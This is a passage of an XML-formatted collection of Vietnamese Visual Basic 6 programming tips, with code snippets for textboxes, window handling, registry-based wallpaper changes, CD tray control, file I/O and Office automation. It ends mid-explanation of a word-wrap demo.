    If (kiemtraemail(EmailText.Text) = False) Then ‘ Nếu địa chỉ email không đúng 
        Beep ‘ Kêu 1 tiếng bíp cho người dùng sợ 
        MsgBox "chu y: Dia chi email khong hop le", vbOKOnly, "Thong bao" 
    Else 
        MsgBox "Dia chi email da hop le", vbOKOnly, "Thong bao" 
    End If 
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000160</MaVD>
    <NoiDung>Type StrPram 
   SoLuong As Integer 
   PramIndex As Variant 
End Type 
Function GetCmdLine() As StrPram 
   Dim CmdLine, stmp 
   CmdLine = Command() 
   If Len(CmdLine) = 0 Then Exit Function 
   CmdLine = Replace(CmdLine, vbTab, " ") 
   CmdLine = Replace(CmdLine, ";", " ") 
   stmp = CmdLine 
   Do 
      stmp = Mid(stmp, I + 1) 
      I = InStr(stmp, " ") 
      GetCmdLine.SoLuong = GetCmdLine.SoLuong + 1 
   Loop Until I = 0 
   If GetCmdLine.SoLuong = 0 Then Exit Function 
   GetCmdLine.PramIndex = Split(CmdLine, " ") 
End Function
'Giả sử tên chương trình là PT37.EXE 
' PT37.EXE c1 c2;c3;c4
Private Sub Form_Load() 
   If GetCmdLine.SoLuong &gt; 0 Then 
      For i = 0 to GetCmdLine.SoLuong -1 
         Msgbox GetCmdLine.PramIndex(i) 
      Next 
   End If
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000161</MaVD>
    <NoiDung>Bạn hãy mở 1 form mới, trên đó tạo 1 textbox (Text1), gán 1 dòng văn bản vào thuộc tính text của textbox, tạo 1 Timer (Timer1). 
Private Sub Form_Load() 
    Timer1.Interval = 100 
End Sub 

Và timer sẽ xử lý các lệnh theo yêu cầu của bạn mỗi khi nó phát sinh 1 sự kiện thời gian. 
Private Sub Timer1_Timer() 
    Dim x As String 
    Dim y As String 
    'gán x = 1 ký tự đầu dòng văn bản 
    x = Left(Text1.Text, 1) 
    'gán y là phần còn lại 
    y = Right(Text1.Text, Len(Text1.Text) - 1) 
    'Hiển thị trở lại TextBox theo thứ tự ngược lại. 
    Text1.Text = y + x 
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000164</MaVD>
    <NoiDung>Private Const EM_SETREADONLY As Long = &amp;HCF
Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hWnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long

Làm cho TextBox trở thành ReadOnly:
SendMessage Text1.hWnd, EM_SETREADONLY, True, 0

Trả TextBox về trạng thái bình thường:
SendMessage Text1.hWnd, EM_SETREADONLY, False, 0</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000165</MaVD>
    <NoiDung>Private Declare Function SendMessage Lib "User32" Alias "SendMessageA" (ByVal hWnd As Long, _
ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
Private Declare Sub ReleaseCapture Lib "User32" ()
Const WM_NCLBUTTONDOWN = &amp;HA1
Const HTCAPTION = 2
Private Sub Form_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
   If Button = 1 Then
   Call ReleaseCapture
   Call SendMessage(Me.hWnd, WM_NCLBUTTONDOWN, HTCAPTION, 0&amp;)
   End If
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000166</MaVD>
    <NoiDung>Tạo 1 TextBox tên Text1 lên Form, viết code như sau: 
Public Sub ChonDL(ctlName As TextBox)
    With ctlName
    .SelStart = 0
    .SelLength = Len(ctlName)
    End With
End Sub
Private Sub Text1_GotFocus()
    Call ChonDL(text1)
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000167</MaVD>
    <NoiDung>Private Declare Function SetWindowPos&amp; Lib "user32" (ByVal hWnd As Long, ByVal hWndInsertAfter As Long, _ 
ByVal X As Long, ByVal Y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) 
Private Declare Function SetForegroundWindow Lib "user32" (ByVal hWnd As Long) As Long 
Private Sub Form_Load() 
   SetWindowPos Me.hWnd, -1, 0, 0, 0, 0, 3 
   Timer1.Interval = 500 
End Sub 
Private Sub Timer1_Timer() 
   SetForegroundWindow Me.hWnd 
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000168</MaVD>
    <NoiDung>Private Sub Form_Load() 
    Me.Show 
    frmSplash.Show 
    DoEvents 
    &lt;Các lệnh cần thực hiện khi khởi động chương trình&gt; 
    Unload frmSplash 
End Sub </NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000169</MaVD>
    <NoiDung>Public Sub UnloadAllForms() 
   Dim Form As Form 
   For Each Form In Forms 
   Unload Form 
   Set Form = Nothing 
   Next Form 
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000170</MaVD>
    <NoiDung>'Send command strings to the mci device
Private Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" _
  (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, _
  ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long 

Dim Error As Long ' Used to store our error message

Sub CmdMo_Click()
 'Open the cdrom door
 Error = mciSendString("set cdaudio door open", 0, 0, 0)
End Sub

Sub CmdDong_Click()
   'Close the cdrom door
   Error = mciSendString("set cdaudio door closed", 0, 0, 0)
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000171</MaVD>
    <NoiDung>Module code: 
Public Declare Function waveOutGetNumDevs Lib "winmm" () As Long 
                   
Public Function CheckSound() As Boolean 
   Dim i As Long 
   i = waveOutGetNumDevs() 
   If i &gt; 0 Then 
      CheckSound = True 
   Else 
      CheckSound = False 
   End If 
End Function 
Và khi sử dụng:
Dim testWav As Boolean 
testWav = CheckSound 
If testWav Then 
   MsgBox ("Co Sound Device") 
Else 
   MsgBox ("Khong co Sound Device") 
End If </NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000172</MaVD>
    <NoiDung>Function bFileExists(sFile As String) As Boolean
 On Error Resume Next
 bFileExists = ((GetAttr(sFile) And vbDirectory) = 0)
End Function
hoặc:
Private Function FileExists(filename) As Boolean 
   On Error GoTo ErrorHandler 
   FileExists = (Dir(filename) &lt;&gt; ") 
   Exit Function 
   ErrorHandler: 
   FileExists = False 
End Function

Sử dụng:
If FileExists("C:\filename.txt") = False Then MsgBox ("Tập tin này không tồn tại.")</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000173</MaVD>
    <NoiDung>Để gọi IE:
Shell "EXPLORER.EXE " &amp; "http://donganhol.com" 
Để gọi vào nick Y!M: 
Shell "EXPLORER.EXE " &amp; "ymsgr:sendIM?phuongthanh37"
Để gửi mail: 
Shell "EXPLORER.EXE " &amp; "mailto:phuongthanh37@donganhol.com"</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000174</MaVD>
    <NoiDung>Khai báo hàm API: 
Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" 
(ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, 
ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long 
Thêm vào Form: 1 CommandButton tên Command1 và 1 TextBox tên txtEmail
Private Sub Command1_Click() 
   SendTo = txtEmail.Text 
   If SendTo = " Then ' Nếu như chưa có địa chỉ email
      MsgBox "There is no email address entered!", 48, "Error sending e-mail" 
   Else 
      SendTo = "mailto:" &amp; SendTo 
      ShellExecute hwnd, "open", SendTo, vbNullString, vbNullString, SW_SHOW 
   End If 
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000176</MaVD>
    <NoiDung>Dim dB As New ADODB.Connection
dB.ConnectionString = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" &amp; tên_tập_tin &amp; ";Persist Security Info=False;Jet OLEDB:Database Password=mật_khẩu_của_bạn"
dB.Open</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000177</MaVD>
    <NoiDung>Sử dụng hàm API:
Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long) 
------------------------ 
Không sử dụng API: 
Public Sub Delay(HowLong as date) 
   TempTime=DateAdd("s", HowLong, Now) 
   While TempTime &gt; Now 
   DoEvents 'Allows windows to handle other stuff 
   Wend 
End Sub

Muốn chương trình dừng lại trong 5 giây: 
Call Sleep(5000) ' for a delay of 5 seconds. 
Hoặc:
Delay 5</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000178</MaVD>
    <NoiDung>Select Case Mid(UCase$(Trim$(Command$)), 1, 2) 
   Case "/C" 'Khi thiết lập cấu hình cho Screensaver 
        frmConfig.Show 
   Case ", "/S" 'Khi Windows chạy chương trình Screensaver 
        runScreensaver 
   Case "/P" 'Khi bạn chọn Screensaver hay bật chế độ xem trước (Preview mode) 
        End 
   Case "/A" 'Khi đặt password cho Screensaver 
        MsgBox "Password Protection not available with this" _ 
                 &amp; " screen saver", vbInformation, "Error" 
End Select</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000180</MaVD>
    <NoiDung>Option Explicit 

'Các hằng số và hàm phục vụ cho việc thay đổi WallPaper 
Private Const SPIF_UPDATEINIFILE = &amp;H1 
Private Const SPI_SETDESKWALLPAPER = 20 
Private Const SPIF_SENDWININICHANGE = &amp;H2 
Private Declare Function SystemParametersInfo Lib "user32" Alias _
  "SystemParametersInfoA" (ByVal uAction As Long, ByVal uParam As Long, _
  ByVal lpvParam As Any, ByVal fuWinIni As Long) As Long 
'Phục vụ cho việc ghi giá trị vào Registry 
Public Enum REG_TOPLEVEL_KEYS 
    HKEY_CLASSES_ROOT = &amp;H80000000 
    HKEY_CURRENT_CONFIG = &amp;H80000005 
    HKEY_CURRENT_USER = &amp;H80000001 
    HKEY_DYN_DATA = &amp;H80000006 
    HKEY_LOCAL_MACHINE = &amp;H80000002 
    HKEY_PERFORMANCE_DATA = &amp;H80000004 
    HKEY_USERS = &amp;H80000003 
End Enum 
Private Declare Function RegCreateKey Lib "advapi32.dll" Alias "RegCreateKeyA" _
  (ByVal Hkey As Long, ByVal lpSubKey As String, phkResult As Long) As Long 
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal Hkey As Long) As Long 
Private Declare Function RegSetValueEx Lib "advapi32.dll" Alias "RegSetValueExA" _
  (ByVal Hkey As Long, ByVal lpValueName As String, ByVal Reserved As Long, _
  ByVal dwType As Long, lpData As Any, ByVal cbData As Long) As Long 
Private Const REG_SZ = 1 

Public Function ChangeWallPaper(ImageFile As String, Optional Tile As Boolean = True, _
  Optional Center As Boolean = True) As Boolean 
    Dim lRet As Long 
    On Error Resume Next 
    If Tile Then 'Kieu Tile 
        WriteStringToRegistry HKEY_CURRENT_USER, "Control Panel\desktop", _
        "TileWallpaper", "1" 
    Else 'Center or Stretch 
        WriteStringToRegistry HKEY_CURRENT_USER, "Control Panel\desktop", _
        "TileWallpaper", "0" 
        'Center 
        If Center Then WriteStringToRegistry HKEY_CURRENT_USER, "Control Panel\Desktop", _
        "WallpaperStyle", "0" Else: WriteStringToRegistry HKEY_CURRENT_USER, _
        "Control Panel\Desktop", "TileWallpaper", "2" ' Stretch 
    End If 
    lRet = SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, ImageFile, _
    SPIF_UPDATEINIFILE Or SPIF_SENDWININICHANGE) 
    ChangeWallPaper = lRet &lt;&gt; 0 
End Function 
Private Function WriteStringToRegistry(Hkey As REG_TOPLEVEL_KEYS, strPath As String, _
  strValue As String, strdata As String) As Boolean 
    Dim bAns As Boolean 
    On Error GoTo ErrorHandler 
    Dim keyhand As Long 
    Dim r As Long 
    r = RegCreateKey(Hkey, strPath, keyhand) 
    If (r = 0) Then 
        r = RegSetValueEx(keyhand, strValue, 0, REG_SZ, ByVal strdata, Len(strdata)) 
        r = RegCloseKey(keyhand) 
    End If 
    WriteStringToRegistry = (r = 0) 
    Exit Function 
 ErrorHandler: 
    WriteStringToRegistry = False 
    MsgBox "Thay doi gia tri Registry khong thanh cong.",, "Loi" 
End Function 

Private Sub Command1_Click() 
    ChangeWallPaper "C:\Ben Tre.bmp" 'Kiểu Tile 
    'ChangeWallPaper "C:\Ben Tre.bmp", False 'Kiểu Center 
    'ChangeWallPaper "C:\Ben Tre.bmp", False, False 'Kiểu Stretch 
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000181</MaVD>
    <NoiDung>Tạo Form mới, thêm vào 1 CommandButton, copy đoạn code sau vào và … F5.

Private Type POINTAPI 
   X As Long 
   Y As Long 
End Type 
 
Private Const MOUSEEVENTF_ABSOLUTE = &amp;H8000 ' absolute move 
Private Const MOUSEEVENTF_LEFTDOWN = &amp;H2 ' left button down 
Private Const MOUSEEVENTF_LEFTUP = &amp;H4 ' left button up 
Private Const MOUSEEVENTF_MOVE = &amp;H1 ' mouse move 
Private Const MOUSEEVENTF_MIDDLEDOWN = &amp;H20 
Private Const MOUSEEVENTF_MIDDLEUP = &amp;H40 
Private Const MOUSEEVENTF_RIGHTDOWN = &amp;H8 
Private Const MOUSEEVENTF_RIGHTUP = &amp;H10 

Private Declare Function GetCursorPos Lib "user32" (lpPoint As POINTAPI) As Long 
Private Declare Sub mouse_event Lib "user32" (ByVal dwFlags As Long, ByVal dx As Long, _
  ByVal dy As Long, ByVal cButtons As Long, ByVal dwExtraInfo As Long) 
Private Declare Function GetMessageExtraInfo Lib "user32" () As Long 
Private Declare Function GetSystemMetrics Lib "user32" (ByVal nIndex As Long) As Long 
 
Const SM_CXSCREEN = 0 'X Size of screen 
Const SM_CYSCREEN = 1 'Y Size of Screen 
 
Private Sub Command1_Click() 
   MsgBox "Ban da Click" 
End Sub 
 
Private Sub Command1_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single) 
Dim p As POINTAPI 
   GetCursorPos p 
   ScreenToAbsolute p 
   Click p 
End Sub 
 
Private Sub ScreenToAbsolute(lpPoint As POINTAPI) 
   lpPoint.X = lpPoint.X * (&amp;HFFFF&amp; / GetSystemMetrics(SM_CXSCREEN)) 
   lpPoint.Y = lpPoint.Y * (&amp;HFFFF&amp; / GetSystemMetrics(SM_CYSCREEN)) 
End Sub 
 
Private Sub Click(p As POINTAPI) 
   'p.X and p.Y in absolute coordinates 
   'Put the mouse on the point 
    mouse_event MOUSEEVENTF_ABSOLUTE Or MOUSEEVENTF_MOVE, p.X, p.Y, 0, GetMessageExtraInfo() 
   'Mouse Down 
    mouse_event MOUSEEVENTF_LEFTDOWN, 0, 0, 0, GetMessageExtraInfo() 
   'Mouse Up 
    mouse_event MOUSEEVENTF_LEFTUP, 0, 0, 0, GetMessageExtraInfo() 
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000183</MaVD>
    <NoiDung>str = string (5, "a") 
str = string (5, "abc") 
str = string (5, 97) 
cả 3 ví dụ này đều cho ra chuỗi "aaaaa"</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000184</MaVD>
    <NoiDung>"abcd" Like "*bcd" = True 
"abcd" Like "a?cd" = True 
"a1cd" Like "a#cd" = True </NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000185</MaVD>
    <NoiDung>Dim Str as String * 4 
Get #Filenum, 3, Str ---&gt; lấy 4 byte bắt đầu từ byte thứ 3 lưu vào Str. 
(nếu có câu lệnh Get tiếp theo mà tham số Position bỏ trống, thì vị trí bắt đầu lấy ra sẽ là byte thứ 8)

Dim noidung()  As Byte
On Error Resume Next
    Open fname For Binary Access Read As #1
        ReDim noidung(LOF(1))
        Get #1,, noidung    'Đọc toàn bộ nội dung file vào biến
    Close #1</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000186</MaVD>
    <NoiDung>Put #filenum,, Str ---&gt; sẽ ghi 4 byte bắt đầu ở vị trí byte thứ 1

Dim fnum As Long
Dim b()  As Byte
    fnum = FreeFile()
    Open fname For Binary Access Write As #fnum
        str = "Nội dung tập tin"
        b = str
        Put #fnum,, b
    Close #fnum</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000187</MaVD>
    <NoiDung>Lock #Filenum, 1 To 100 ---&gt; sẽ khoá 100 byte từ byte thứ 1

Unlock #Filenum, 1 To 100 ---&gt; sẽ mở khoá 100 byte từ byte thứ 1</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000188</MaVD>
    <NoiDung>Vào Tools \ Menu Editor và tạo 1 Menu có tên là Mnurich với 1 hoặc 2 đề mục. Kế tiếp, thêm 1 Rich TextBox và đoạn code sau đây vào Form:

Private Sub RichTextBox1_MouseDown(Button As Integer, _ 
        Shift As Integer, X As Single, Y As Single) 
    If Button = vbRightButton Then 
        Me.PopupMenu Mnurich 
    End If 
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000189</MaVD>
    <NoiDung>Private Declare Function GetKeyboardState Lib "user32" _ 
        (pbKeyState As Byte) As Long 

Private Sub Timer1_Timer() 
    Dim b(0 To 254) As Byte 
    Dim sMsg As String 
    GetKeyboardState b(0) 
    
    If b(vbKeyNumlock) Then 
        sMsg = "NUM" 
    End If 
    
    If b(vbKeyCapital) Then 
        sMsg = sMsg &amp; " CAPS" 
    End If 
    
    If (Label1.Caption &lt;&gt; sMsg) Then 
        Label1.Caption = sMsg 
    End If 
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000190</MaVD>
    <NoiDung>Declare Function GetComputerName Lib "kernel32" _ 
        Alias "GetComputerNameA" (ByVal lpBuffer As String, _ 
        nSize As Long) As Long 


Function ComputerName() As String 
    Dim strBuffer As String * 255 
    If GetComputerName(strBuffer, 255&amp;) &lt;&gt; 0 Then 
        ComputerName = Left(strBuffer, InStr(strBuffer, _ 
                vbNullChar) - 1) 
    Else 
        ComputerName = "N/A" 
    End If 
End Function

Private Sub Form_Load() 
    MsgBox "ComputerName: " &amp; ComputerName,, "ComputerName" 
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000191</MaVD>
    <NoiDung>Bạn hãy đặt 1 Label, 1 CommandButton, 1 Timer và đoạn code sau đây vào Form:

Private Sub Command1_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single) 
    Timer1.Enabled = True 
End Sub 

Private Sub Command1_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single) 
    Timer1.Enabled = False 
    Label1.Caption = "Clock" 
End Sub 

Private Sub Form_Load() 
    Timer1.Interval = 100 
End Sub 

Private Sub Timer1_Timer() 
    Label1.Caption = Now 
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000192</MaVD>
    <NoiDung>Có 1 Form chứa 3 CommandButton và những thủ tục sau đây: 
Private Sub Command1_Click() 
    MsgBox "Button 1 clicked!" 
End Sub 

Private Sub Command2_Click() 
    MsgBox "Button 2 clicked!" 
End Sub 

Private Sub Command3_Click() 
    MsgBox "Button 3 clicked!" 
End Sub

Một Form khác chứa 1 CommandButton tên là btnTrigger và thủ tục sau đây: 
Private Sub btnTrigger_Click() 
    Form1.Command1.Value = True 
    Form1.Command2.Value = True 
    Form1.Command3.Value = True 
End Sub

Bây giờ, giả sử cả 2 Form đều đã được load, khi bạn click vào Button btnTrigger, các sự kiện click cho Command1, Command2, Command3 sẽ được thực thi.
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000193</MaVD>
    <NoiDung>Đầu tiên, bạn vào Project \ References và chọn Microsoft Powerpoint 10.0 Object Library. 

Kế tiếp, thêm một CommandButton và đoạn code sau đây vào Form: 

Private Sub Command1_Click() 

    Dim ppApp As PowerPoint.Application 
    Set ppApp = CreateObject("Powerpoint.Application") 
  
    Dim ppPres As PowerPoint.Presentation 
    Set ppPres = ppApp.Presentations.Add(msoTrue) 
  
    Dim ppSlide1 As PowerPoint.Slide 
    Set ppSlide1 = ppPres.Slides.Add(1, ppLayoutText) 
    ppSlide1.Shapes(1).TextFrame.TextRange.Text = "Luan van tot nghiep" 
    ppSlide1.Shapes(2).TextFrame.TextRange.Text = "Sinh vien" &amp; vbCr &amp; "Nguyen Van A" 
  
    Dim ppSlide2 As PowerPoint.Slide 
    Set ppSlide2 = ppPres.Slides.Add(2, ppLayoutTextAndChart) 
    ppSlide2.Shapes(1).TextFrame.TextRange.Text = "De tai" 
    ppSlide2.Shapes(2).TextFrame.TextRange.Text = "Chuyen ma tieng Viet" 
    
    Dim cTop As Double 
    Dim cWidth As Double 
    Dim cHeight As Double 
    Dim cLeft As Double 
    
    With ppSlide2.Shapes(3) 
        cTop = .Top 
        cWidth = .Width 
        cHeight = .Height 
        cLeft = .Left 
        .Delete 
    End With 
    ppSlide2.Shapes.AddOLEObject cLeft, cTop, cWidth, cHeight, "MSGraph.Chart" 
  
    With ppPres.SlideShowSettings 
        .AdvanceMode = ppSlideShowUseSlideTimings 
        .Run 
    End With 
    
    ppPres.SaveAs App.Path &amp; "\test.ppt" 

End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000194</MaVD>
    <NoiDung>Module code:
Option Explicit 

Public Const SWP_DRAWFRAME As Long = &amp;H20 
Public Const SWP_NOMOVE As Long = &amp;H2 
Public Const SWP_NOSIZE As Long = &amp;H1 
Public Const SWP_NOZORDER As Long = &amp;H4 
Public Const SWP_FLAGS As Long = SWP_NOZORDER Or SWP_NOSIZE Or _ 
                                 SWP_NOMOVE Or SWP_DRAWFRAME 
Public Const GWL_STYLE As Long = (-16) 
Public Const WS_THICKFRAME As Long = &amp;H40000 

Public Declare Function GetWindowLong Lib "user32" _ 
     Alias "GetWindowLongA" _ 
    (ByVal hwnd As Long, _ 
     ByVal nIndex As Long) As Long 

Public Declare Function SetWindowLong Lib "user32" _ 
     Alias "SetWindowLongA" _ 
    (ByVal hwnd As Long, _ 
     ByVal nIndex As Long, _ 
     ByVal dwNewLong As Long) As Long 

Public Declare Function SetWindowPos Lib "user32" _ 
    (ByVal hwnd As Long, _ 
     ByVal hWndInsertAfter As Long, _ 
     ByVal X As Long, _ 
     ByVal Y As Long, _ 
     ByVal cx As Long, _ 
     ByVal cy As Long, _ 
     ByVal wFlags As Long) As Long
Thêm vào Form 1 TextBox, 2 CommandButton và 2 Label. 

Form code: 
Option Explicit 

Dim initBoxStyle As Long 
Dim initLeft As Integer 
Dim initTop As Integer 
Dim initWidth As Integer 
Dim initHeight As Integer 

Private Sub Command2_Click() 
   SetControlStyle initBoxStyle, Text1 
End Sub 

Private Sub Form_Load() 
   initBoxStyle = GetWindowLong(Text1.hwnd, GWL_STYLE) 
   initLeft = Text1.Left 
   initTop = Text1.Top 
   initWidth = Text1.Width 
   initHeight = Text1.Height 

   SetControlStyle initBoxStyle, Text1 
  
   Label1.Caption = "Text Width : " &amp; Text1.Width 
   Label2.Caption = "Text Height: " &amp; Text1.Height 
   Command1.Caption = "Resize" 
   Command2.Caption = "Restore" 
End Sub 

Private Sub Form_Unload(Cancel As Integer) 
   SetControlStyle initBoxStyle, Text1 
End Sub 

Private Sub Form_Click() 
   SetControlStyle initBoxStyle, Text1 
  
   Label1.Caption = "Text Width : " &amp; Text1.Width 
   Label2.Caption = "Text Height: " &amp; Text1.Height 
End Sub 

Private Sub Command1_Click() 
    
   Dim style As Long 
  
   style = GetWindowLong(Text1.hwnd, GWL_STYLE) 
  
   style = style Or WS_THICKFRAME 

   SetControlStyle style, Text1 

End Sub 

Private Sub SetControlStyle(style, X As Control) 
    
  If style Then 
    Call SetWindowLong(X.hwnd, GWL_STYLE, style) 
    Call SetWindowPos(X.hwnd, Form1.hwnd, 0, 0, 0, 0, SWP_FLAGS) 
  End If 

End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000195</MaVD>
    <NoiDung>Module code:
Private Declare Function SendMessageLong Lib "user32" _
Alias "SendMessageA" (ByVal hwnd As Long, _
ByVal wMsg As Long, ByVal wParam As Long, _
ByVal lParam As Long) As Long

Private Const CB_GETDROPPEDWIDTH = &amp;H15F
Private Const CB_SETDROPPEDWIDTH = &amp;H160

Private Type RECT
   Left As Long
   Top As Long
   Right As Long
   Bottom As Long
End Type

Private Declare Function DrawText Lib "user32" _
Alias "DrawTextA" (ByVal hdc As Long, _
ByVal lpStr As String, ByVal nCount As Long, _
lpRect As RECT, ByVal wFormat As Long) As Long

Private Const DT_CALCRECT = &amp;H400

Public Property Let DropDownWidth(ByRef cboThis As ComboBox, _
ByVal lWidth As Long)
    SendMessageLong cboThis.hwnd, CB_SETDROPPEDWIDTH, lWidth, 0
End Property

Public Property Get DropDownWidth(ByRef cboThis As ComboBox) _
As Long
Dim lW As Long
DropDownWidth = SendMessageLong(cboThis.hwnd, _
CB_GETDROPPEDWIDTH, 0, 0)
End Property

Public Sub DropDownWidthFromContents(ByRef cboThis As ComboBox, _
Optional ByVal lMaxWidth = -1)

Dim i As Long
Dim tR As RECT
Dim lW As Long
Dim lWidth As Long
Dim lHDC As Long

    With cboThis.Parent.Font
        .Name = cboThis.Font.Name
        .Size = cboThis.Font.Size
        .Bold = cboThis.Font.Bold
        .Italic = cboThis.Font.Italic
    End With

    lHDC = cboThis.Parent.hdc
    
    For i = 0 To cboThis.ListCount - 1
        DrawText lHDC, cboThis.List(i), -1, tR, DT_CALCRECT
        lW = tR.Right - tR.Left + 8
    
        If (lW &gt; lWidth) Then
            lWidth = lW
        End If
    Next i
        
    If lMaxWidth &lt;= 0 Then
        lMaxWidth = Screen.Width \ Screen.TwipsPerPixelX - 16
    End If
    
    If (lWidth &gt; lMaxWidth) Then
        lWidth = lMaxWidth
    End If
        
    If (lWidth &lt; cboThis.Width \ Screen.TwipsPerPixelX) Then
        lWidth = cboThis.Width \ Screen.TwipsPerPixelX
    End If
        
    DropDownWidth(cboThis) = lWidth

End Sub

Thêm vào Form: 1 ComboBox, 1 Label và 1 CommandButton. Copy đoạn code sau vào:
Private Sub Command1_Click()
    Dim sI As String
    sI = InputBox("Enter width",, DropDownWidth(Combo1))
    If IsNumeric(sI) Then
        DropDownWidth(Combo1) = CLng(sI)
        Label1.Caption = DropDownWidth(Combo1)
    End If
End Sub

Private Sub Form_Load()
    Label1.Caption = DropDownWidth(Combo1)
    Combo1.AddItem "Chao mung"
    Combo1.AddItem "den"
    Combo1.AddItem "http://www.Caulacbovb.com"
    
    DropDownWidthFromContents Combo1
    Label1.Caption = DropDownWidth(Combo1)
    Command1.Caption = "SetWidth"
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000197</MaVD>
    <NoiDung>Private Declare Function DeleteMenu Lib "user32" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long) As Long
Private Declare Function GetSystemMenu Lib "user32" (ByVal hwnd As Long, ByVal bRevert As Long) As Long
Private Const MF_BYPOSITION = &amp;H400&amp;

Private Sub RemoveMenus(frm As Form, _
    remove_restore As Boolean, _
    remove_move As Boolean, _
    remove_size As Boolean, _
    remove_minimize As Boolean, _
    remove_maximize As Boolean, _
    remove_seperator As Boolean, _
    remove_close As Boolean)
Dim hMenu As Long
    
    ' Get the form's system menu handle.
    hMenu = GetSystemMenu(hwnd, False)
    
    If remove_close Then DeleteMenu hMenu, 6, MF_BYPOSITION
    If remove_seperator Then DeleteMenu hMenu, 5, MF_BYPOSITION
    If remove_maximize Then DeleteMenu hMenu, 4, MF_BYPOSITION
    If remove_minimize Then DeleteMenu hMenu, 3, MF_BYPOSITION
    If remove_size Then DeleteMenu hMenu, 2, MF_BYPOSITION
    If remove_move Then DeleteMenu hMenu, 1, MF_BYPOSITION
    If remove_restore Then DeleteMenu hMenu, 0, MF_BYPOSITION
End Sub

Private Sub Form_Load()
    RemoveMenus Me, True, False, False, True, True, True, True
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000198</MaVD>
    <NoiDung>Sau đây là Code của một số Control cần thiết cho việc Demo chức năng Wordwrap.
Option Explicit 
Private Sub Form_Resize() 
Text1.Move 0, 0, ScaleWidth, ScaleHeight 
Text2.Move 0, 0, ScaleWidth, ScaleHeight 
End Sub

Điều chỉnh kích thước và vị trí của 2 Textbox, cho thích hợp với kích thước của Form mỗi khi người dùng thay đổi kích thớc cửa sổ, hoặc chương trình khởi động. Xin bạn hãy nhớ một điều là: tình huống Form_Resize luôn luôn được triệu gọi mỗi khi Form_Load. 

Private Sub mnuWWrap_Click() 
 mnuWWrap.Checked = Not (mnuWWrap.Checked) 
 If mnuWWrap.Checked = True Then 
 Text1.Visible = False 
 Text2.Visible = True 
 Text2.SetFocus 
 Else 
 Text1.Visible = True 
 Text2.Visible = False 
 Text1.SetFocus 
 End If 
End Sub

Các lệnh cần xử lý khi người dùng chọn chức năng Wordwrap. Cho ẩn hiện Text1 hay Text2 tùy theo trạng thái (check hoặc không check) của menu WordWrap. 

Private Sub Text1_Change() 
Text2.Text = Text1.Text 
End Sub 
Private Sub Text2_Change() 
Text1.Text = Text2.Text 
End Sub

Tuy nhiên tại mỗi thời điểm, người dùng chỉ làm việc (gõ văn bản) trên một Textbox mà thôi, cho nên ta phải tiến hành cập nhật liên tục nội dung của 2 Textbox mỗi khi có 1 sự thay đổi nào đó trên bất cứ Textbox nào nhờ vào thủ tục tình huống Change. 
Nhưng nếu chỉ bấy nhiêu đó thôi thì không ổn. Mỗi lần người dùng chuyển qua lại giữa Wordwrap và không Wordwrap tức là thay đổi Textbox, tự nhiên ngời dùng có cảm giác là lạ do con trỏ không nằm đúng vị trí quả thật là hơi "vô duyên". Để khắc phục nhược điểm trên bạn hãy thêm vài dòng Code sau đây vào chương trình đảm bảo người dùng không hề biết được là bạn đã đánh tráo Textbox của họ mỗi khi chọn chức năng Wordwrap. 

